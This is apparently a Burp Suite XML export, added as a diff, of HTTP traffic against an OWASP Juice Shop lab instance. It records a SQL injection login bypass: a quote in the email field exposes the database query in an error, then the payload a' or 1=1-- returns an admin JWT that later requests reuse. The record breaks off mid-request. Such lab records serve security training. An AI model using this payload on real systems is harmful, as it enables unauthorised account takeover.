@@ -1,0 +1,427 @@
+<?xml version="1.1"?>
+<!-- NOTE: Any NULL bytes in requests and responses are preserved within this output, even though this strictly breaks the XML syntax. If your XML parser rejects the NULL bytes then you will need to remove or replace these bytes before parsing. Alternatively, you can use the option to base64-encode requests and responses. -->
+<!DOCTYPE items [
+<!ELEMENT items (item*)>
+<!ATTLIST items burpVersion CDATA "">
+<!ATTLIST items exportTime CDATA "">
+<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT url (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT port (#PCDATA)>
+<!ELEMENT protocol (#PCDATA)>
+<!ELEMENT method (#PCDATA)>
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT extension (#PCDATA)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT status (#PCDATA)>
+<!ELEMENT responselength (#PCDATA)>
+<!ELEMENT mimetype (#PCDATA)>
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT comment (#PCDATA)>
+]>
+<items burpVersion="2020.12.1" exportTime="Sun Sep 26 21:31:42 CST 2021">
+  <item>
+    <time>Sun Sep 26 19:28:35 CST 2021</time>
+    <url><![CDATA[http://10.10.169.236/rest/user/login]]></url>
+    <host ip="10.10.169.236">10.10.169.236</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/rest/user/login]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /rest/user/login HTTP/1.1
+Host: 10.10.169.236
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 34
+Origin: http://10.10.169.236
+Connection: close
+Referer: http://10.10.169.236/
+Cookie: io=3qNaihF-ht8eBRgpAAAa; language=en; cookieconsent_status=dismiss; continueCode=KQabVVENkBvjq9O2xgyoWrXb45wGnmTxdaL8m1pzYlPQKJMZ6D37neRqyn3x
+
+{"email":"a'","password":"123456"}]]></request>
+    <status>500</status>
+    <responselength>1544</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 500 Internal Server Error
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+Content-Type: application/json; charset=utf-8
+Vary: Accept-Encoding
+Date: Sun, 26 Sep 2021 11:28:35 GMT
+Connection: close
+Content-Length: 1232
+
+{
+  "error": {
+    "message": "SQLITE_ERROR: near \"e10adc3949ba59abbe56e057f20f883e\": syntax error",
+    "stack": "SequelizeDatabaseError: SQLITE_ERROR: near \"e10adc3949ba59abbe56e057f20f883e\": syntax error\n    at Query.formatError (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:422:16)\n    at Query._handleQueryResponse (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:73:18)\n    at afterExecute (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:250:31)\n    at replacement (/juice-shop/node_modules/sqlite3/lib/trace.js:19:31)\n    at Statement.errBack (/juice-shop/node_modules/sqlite3/lib/sqlite3.js:14:21)",
+    "name": "SequelizeDatabaseError",
+    "parent": {
+      "errno": 1,
+      "code": "SQLITE_ERROR",
+      "sql": "SELECT * FROM Users WHERE email = 'a'' AND password = 'e10adc3949ba59abbe56e057f20f883e' AND deletedAt IS NULL"
+    },
+    "original": {
+      "errno": 1,
+      "code": "SQLITE_ERROR",
+      "sql": "SELECT * FROM Users WHERE email = 'a'' AND password = 'e10adc3949ba59abbe56e057f20f883e' AND deletedAt IS NULL"
+    },
+    "sql": "SELECT * FROM Users WHERE email = 'a'' AND password = 'e10adc3949ba59abbe56e057f20f883e' AND deletedAt IS NULL"
+  }
+}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Sep 26 19:28:35 CST 2021</time>
+    <url><![CDATA[http://10.10.169.236/rest/user/whoami]]></url>
+    <host ip="10.10.169.236">10.10.169.236</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/user/whoami]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /rest/user/whoami HTTP/1.1
+Host: 10.10.169.236
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.169.236/
+Cookie: io=3qNaihF-ht8eBRgpAAAa; language=en; cookieconsent_status=dismiss; continueCode=KQabVVENkBvjq9O2xgyoWrXb45wGnmTxdaL8m1pzYlPQKJMZ6D37neRqyn3x
+If-None-Match: W/"b-/5bSboVjVhGw3qRgvUfZjE1r1Ns"
+
+]]></request>
+    <status>304</status>
+    <responselength>252</responselength>
+    <mimetype></mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 304 Not Modified
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+ETag: W/"b-/5bSboVjVhGw3qRgvUfZjE1r1Ns"
+Date: Sun, 26 Sep 2021 11:28:35 GMT
+Connection: close
+
+]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Sep 26 19:28:35 CST 2021</time>
+    <url><![CDATA[http://10.10.169.236/rest/user/whoami]]></url>
+    <host ip="10.10.169.236">10.10.169.236</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/user/whoami]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /rest/user/whoami HTTP/1.1
+Host: 10.10.169.236
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.169.236/
+Cookie: io=3qNaihF-ht8eBRgpAAAa; language=en; cookieconsent_status=dismiss; continueCode=KQabVVENkBvjq9O2xgyoWrXb45wGnmTxdaL8m1pzYlPQKJMZ6D37neRqyn3x
+
+]]></request>
+    <status>200</status>
+    <responselength>343</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+Content-Type: application/json; charset=utf-8
+Content-Length: 11
+ETag: W/"b-/5bSboVjVhGw3qRgvUfZjE1r1Ns"
+Vary: Accept-Encoding
+Date: Sun, 26 Sep 2021 11:28:35 GMT
+Connection: close
+
+{"user":{}}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Sep 26 19:29:07 CST 2021</time>
+    <url><![CDATA[http://10.10.169.236/rest/user/login]]></url>
+    <host ip="10.10.169.236">10.10.169.236</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/rest/user/login]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /rest/user/login HTTP/1.1
+Host: 10.10.169.236
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 43
+Origin: http://10.10.169.236
+Connection: close
+Referer: http://10.10.169.236/
+Cookie: io=3qNaihF-ht8eBRgpAAAa; language=en; cookieconsent_status=dismiss; continueCode=KQabVVENkBvjq9O2xgyoWrXb45wGnmTxdaL8m1pzYlPQKJMZ6D37neRqyn3x
+
+{"email":"a' or 1=1--","password":"123456"}]]></request>
+    <status>200</status>
+    <responselength>1166</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+Content-Type: application/json; charset=utf-8
+Content-Length: 831
+ETag: W/"33f-GNoqO6mzdJqrIp9+uvgsXxIvm1M"
+Vary: Accept-Encoding
+Date: Sun, 26 Sep 2021 11:29:08 GMT
+Connection: close
+
+{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMC4xMS40NS4xMDYiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTA5LTI2IDEwOjA0OjExLjQ2MSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTA5LTI2IDExOjI4OjE3LjYwMyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2MzI2NTU3NDgsImV4cCI6MTYzMjY3Mzc0OH0.UF04RMTg_E5JppM5zLjQ_LG1LOCmfv_YcBOW0gG1aJH5YzUY28lD4YFFLjsPFtmYF8PFCnx8SyORVeJOT2cM9Z4jM2_L-c5mBiQWxdV3j8DZu_WtsTWgOeLh9G5lmUxiw_YqSULioR1hoJ6gwbEYPZUiGgKbYVpwCRJ97kWABmw","bid":1,"umail":"admin@juice-sh.op"}}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Sep 26 19:29:07 CST 2021</time>
+    <url><![CDATA[http://10.10.169.236/rest/user/whoami]]></url>
+    <host ip="10.10.169.236">10.10.169.236</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/user/whoami]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /rest/user/whoami HTTP/1.1
+Host: 10.10.169.236
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.169.236/
+Cookie: io=3qNaihF-ht8eBRgpAAAa; language=en; cookieconsent_status=dismiss; continueCode=KQabVVENkBvjq9O2xgyoWrXb45wGnmTxdaL8m1pzYlPQKJMZ6D37neRqyn3x
+If-None-Match: W/"b-/5bSboVjVhGw3qRgvUfZjE1r1Ns"
+
+]]></request>
+    <status>304</status>
+    <responselength>252</responselength>
+    <mimetype></mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 304 Not Modified
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+ETag: W/"b-/5bSboVjVhGw3qRgvUfZjE1r1Ns"
+Date: Sun, 26 Sep 2021 11:29:08 GMT
+Connection: close
+
+]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Sep 26 19:29:07 CST 2021</time>
+    <url><![CDATA[http://10.10.169.236/rest/user/whoami]]></url>
+    <host ip="10.10.169.236">10.10.169.236</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/user/whoami]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /rest/user/whoami HTTP/1.1
+Host: 10.10.169.236
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.169.236/
+Cookie: io=3qNaihF-ht8eBRgpAAAa; language=en; cookieconsent_status=dismiss; continueCode=KQabVVENkBvjq9O2xgyoWrXb45wGnmTxdaL8m1pzYlPQKJMZ6D37neRqyn3x
+
+]]></request>
+    <status>200</status>
+    <responselength>343</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+Content-Type: application/json; charset=utf-8
+Content-Length: 11
+ETag: W/"b-/5bSboVjVhGw3qRgvUfZjE1r1Ns"
+Vary: Accept-Encoding
+Date: Sun, 26 Sep 2021 11:29:08 GMT
+Connection: close
+
+{"user":{}}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Sep 26 19:29:08 CST 2021</time>
+    <url><![CDATA[http://10.10.169.236/rest/user/whoami]]></url>
+    <host ip="10.10.169.236">10.10.169.236</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/user/whoami]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /rest/user/whoami HTTP/1.1
+Host: 10.10.169.236
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMC4xMS40NS4xMDYiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTA5LTI2IDEwOjA0OjExLjQ2MSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTA5LTI2IDExOjI4OjE3LjYwMyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2MzI2NTU3NDgsImV4cCI6MTYzMjY3Mzc0OH0.UF04RMTg_E5JppM5zLjQ_LG1LOCmfv_YcBOW0gG1aJH5YzUY28lD4YFFLjsPFtmYF8PFCnx8SyORVeJOT2cM9Z4jM2_L-c5mBiQWxdV3j8DZu_WtsTWgOeLh9G5lmUxiw_YqSULioR1hoJ6gwbEYPZUiGgKbYVpwCRJ97kWABmw
+Connection: close
+Referer: http://10.10.169.236/
+Cookie: io=3qNaihF-ht8eBRgpAAAa; language=en; cookieconsent_status=dismiss; continueCode=KQabVVENkBvjq9O2xgyoWrXb45wGnmTxdaL8m1pzYlPQKJMZ6D37neRqyn3x; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMC4xMS40NS4xMDYiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTA5LTI2IDEwOjA0OjExLjQ2MSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTA5LTI2IDExOjI4OjE3LjYwMyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2MzI2NTU3NDgsImV4cCI6MTYzMjY3Mzc0OH0.UF04RMTg_E5JppM5zLjQ_LG1LOCmfv_YcBOW0gG1aJH5YzUY28lD4YFFLjsPFtmYF8PFCnx8SyORVeJOT2cM9Z4jM2_L-c5mBiQWxdV3j8DZu_WtsTWgOeLh9G5lmUxiw_YqSULioR1hoJ6gwbEYPZUiGgKbYVpwCRJ97kWABmw
+If-None-Match: W/"b-/5bSboVjVhGw3qRgvUfZjE1r1Ns"
+
+]]></request>
+    <status>200</status>
+    <responselength>466</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+Content-Type: application/json; charset=utf-8
+Content-Length: 132
+ETag: W/"84-5qMZW4yKCzQTFdtCTdcoD043/Lc"
+Vary: Accept-Encoding
+Date: Sun, 26 Sep 2021 11:29:08 GMT
+Connection: close
+
+{"user":{"id":1,"email":"admin@juice-sh.op","lastLoginIp":"10.11.45.106","profileImage":"assets/public/images/uploads/default.svg"}}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Sep 26 19:29:08 CST 2021</time>
+    <url><![CDATA[http://10.10.169.236/rest/user/whoami]]></url>
+    <host ip="10.10.169.236">10.10.169.236</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/user/whoami]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /rest/user/whoami HTTP/1.1
+Host: 10.10.169.236
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMC4xMS40NS4xMDYiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTA5LTI2IDEwOjA0OjExLjQ2MSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTA5LTI2IDExOjI4OjE3LjYwMyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2MzI2NTU3NDgsImV4cCI6MTYzMjY3Mzc0OH0.UF04RMTg_E5JppM5zLjQ_LG1LOCmfv_YcBOW0gG1aJH5YzUY28lD4YFFLjsPFtmYF8PFCnx8SyORVeJOT2cM9Z4jM2_L-c5mBiQWxdV3j8DZu_WtsTWgOeLh9G5lmUxiw_YqSULioR1hoJ6gwbEYPZUiGgKbYVpwCRJ97kWABmw
+Connection: close
+Referer: http://10.10.169.236/
+Cookie: io=3qNaihF-ht8eBRgpAAAa; language=en; cookieconsent_status=dismiss; continueCode=KQabVVENkBvjq9O2xgyoWrXb45wGnmTxdaL8m1pzYlPQKJMZ6D37neRqyn3x; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMC4xMS40NS4xMDYiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTA5LTI2IDEwOjA0OjExLjQ2MSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTA5LTI2IDExOjI4OjE3LjYwMyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2MzI2NTU3NDgsImV4cCI6MTYzMjY3Mzc0OH0.UF04RMTg_E5JppM5zLjQ_LG1LOCmfv_YcBOW0gG1aJH5YzUY28lD4YFFLjsPFtmYF8PFCnx8SyORVeJOT2cM9Z4jM2_L-c5mBiQWxdV3j8DZu_WtsTWgOeLh9G5lmUxiw_YqSULioR1hoJ6gwbEYPZUiGgKbYVpwCRJ97kWABmw
+
+]]></request>
+    <status>200</status>
+    <responselength>466</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+Content-Type: application/json; charset=utf-8
+Content-Length: 132
+ETag: W/"84-5qMZW4yKCzQTFdtCTdcoD043/Lc"
+Vary: Accept-Encoding
+Date: Sun, 26 Sep 2021 11:29:08 GMT
+Connection: close
+
+{"user":{"id":1,"email":"admin@juice-sh.op","lastLoginIp":"10.11.45.106","profileImage":"assets/public/images/uploads/default.svg"}}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Sep 26 19:29:08 CST 2021</time>
+    <url><![CDATA[http://10.10.169.236/api/Quantitys/]]></url>
+    <host ip="10.10.169.236">10.10.169.236</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/api/Quantitys/]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /api/Quantitys/ HTTP/1.1
+Host: 10.10.169.236
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMC4xMS40NS4xMDYiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTA5LTI2IDEwOjA0OjExLjQ2MSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTA5LTI2IDExOjI4OjE3LjYwMyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2MzI2NTU3NDgsImV4cCI6MTYzMjY3Mzc0OH0.UF04RMTg_E5JppM5zLjQ_LG1LOCmfv_YcBOW0gG1aJH5YzUY28lD4YFFLjsPFtmYF8PFCnx8SyORVeJOT2cM9Z4jM2_L-c5mBiQWxdV3j8DZu_WtsTWgOeLh9G5lmUxiw_YqSULioR1hoJ6gwbEYPZUiGgKbYVpwCRJ97kWABmw
+Connection: close
+Referer: http://10.10.169.236/
+Cookie: io=3qNaihF-ht8eBRgpAAAa; language=en; cookieconsent_status=dismiss; continueCode=KQabVVENkBvjq9O2xgyoWrXb45wGnmTxdaL8m1pzYlPQKJMZ6D37neRqyn3x; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMC4xMS40NS4xMDYiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTA5LTI2IDEwOjA0OjExLjQ2MSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTA5LTI2IDExOjI4OjE3LjYwMyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2MzI2NTU3NDgsImV4cCI6MTYzMjY3Mzc0OH0.UF04RMTg_E5JppM5zLjQ_LG1LOCmfv_YcBOW0gG1aJH5YzUY28lD4YFFLjsPFtmYF8PFCnx8SyORVeJOT2cM9Z4jM2_L-c5mBiQWxdV3j8DZu_WtsTWgOeLh9G5lmUxiw_YqSULioR1hoJ6gwbEYPZUiGgKbYVpwCRJ97kWABmw
+If-None-Match: W/"154f-gzv9NAN1AIQUjaCX6ZAJqfGWYDo"
+
+]]></request>
+    <status>304</status>
+    <responselength>285</responselength>
+    <mimetype></mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 304 Not Modified
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+Content-Range: items 0-39/40
+ETag: W/"154f-gzv9NAN1AIQUjaCX6ZAJqfGWYDo"
+Date: Sun, 26 Sep 2021 11:29:09 GMT
+Connection: close
+
+]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Sep 26 19:29:08 CST 2021</time>
+    <url><![CDATA[http://10.10.169.236/rest/products/search?q=]]></url>
+    <host ip="10.10.169.236">10.10.169.236</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /rest/products/search?q= HTTP/1.1
+Host: 10.10.169.236
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMC4xMS40NS4xMDYiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTA5LTI2IDEwOjA0OjExLjQ2MSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTA5LTI2IDExOjI4OjE3LjYwMyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2MzI2NTU3NDgsImV4cCI6MTYzMjY3Mzc0OH0.UF04RMTg_E5JppM5zLjQ_LG1LOCmfv_YcBOW0gG1aJH5YzUY28lD4YFFLjsPFtmYF8PFCnx8SyORVeJOT2cM9Z4jM2_L-c5mBiQWxdV3j8DZu_WtsTWgOeLh9G5lmUxiw_YqSULioR1hoJ6gwbEYPZUiGgKbYVpwCRJ97kWABmw
+Connection: close
+Referer: http://10.10.169.236/
